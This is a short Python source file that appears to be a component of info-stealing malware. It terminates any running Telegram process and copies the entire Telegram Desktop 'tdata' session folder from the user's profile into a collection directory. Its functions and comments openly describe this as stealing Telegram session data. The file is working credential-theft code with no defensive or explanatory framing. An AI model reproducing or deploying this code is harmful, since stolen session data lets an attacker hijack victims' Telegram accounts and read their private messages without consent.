import os
import shutil
import psutil

def close_telegram():
    # Kill Telegram process 
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in ['telegram.exe', 'telegram']:
                proc.kill()
    except:
        pass

def steal_telegram(output_dir):
    # Steal Telegram session data 
    source_folder = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Telegram Desktop", "tdata")
    
    if not os.path.exists(source_folder):
        return False, "Telegram not installed"
    
    telegram_dir = os.path.join(output_dir, "Telegram_Session")
    os.makedirs(telegram_dir, exist_ok=True)
    
    try:
        close_telegram()
        
        copied_files = 0
        for root, dirs, files in os.walk(source_folder):
            for file in files:
                try:
                    source_file = os.path.join(root, file)
                    relative_path = os.path.relpath(source_file, source_folder)
                    destination_file = os.path.join(telegram_dir, relative_path)
                    
                    destination_dir = os.path.dirname(destination_file)
                    os.makedirs(destination_dir, exist_ok=True)
                    
                    shutil.copy2(source_file, destination_file)
                    copied_files += 1
                except:
                    continue
        
        return True, f"Copied {copied_files} files"
    except Exception as e:
        return False, str(e)